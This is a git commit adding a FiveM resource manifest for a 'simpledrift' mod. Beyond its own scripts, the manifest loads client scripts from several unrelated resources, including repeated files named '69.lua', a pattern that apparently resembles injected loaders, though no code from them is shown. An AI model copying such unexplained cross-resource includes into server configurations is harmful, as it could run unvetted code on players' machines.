8a3bcbe21c0d50d381440163909a0e192e6ecacb
S3OUD12 <78036148+S3OUD12@users.noreply.github.com>
2021-01-26 19:52:42 +0400

    Add files via upload

---
+++ simpledrift/__resource.lua
@@ -0,0 +1,12 @@
+resource_manifest_version '77731fab-63ca-442c-a67b-abc70f28dfa5'
+client_script 'drift.lua' client_script 'pt.lua' client_script '@HolyNut/holyc.lua'
+
+client_script "@vrp_flat_carUI/69.lua"
+
+client_script "@vrp_flat_zayed_fa7/69.lua"
+
+client_script "@VTC_zayed/69.lua"
+
+client_script "@S9_moha/69.lua"
+
+client_script "@vrp_basic_quest/69.lua"
